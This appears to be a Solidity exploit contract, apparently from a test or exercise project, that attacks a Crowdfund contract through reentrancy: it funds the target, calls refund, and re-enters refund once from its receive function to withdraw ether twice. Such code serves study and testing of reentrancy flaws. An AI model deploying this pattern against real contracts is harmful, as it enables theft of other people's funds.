// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8;
import {Crowdfund} from "../Crowdfund.sol";
contract Attacker {
    Crowdfund public target;
    bool internal attacked;

    constructor(address _target) {
        target = Crowdfund(_target);
    }

    receive() external payable {
        if (!attacked && address(target).balance >= 1 ether) {
            attacked = true;
            target.refund();
        }
    }

    function attack() external payable {
        target.fund{value: msg.value}();
        target.refund();
    }
}

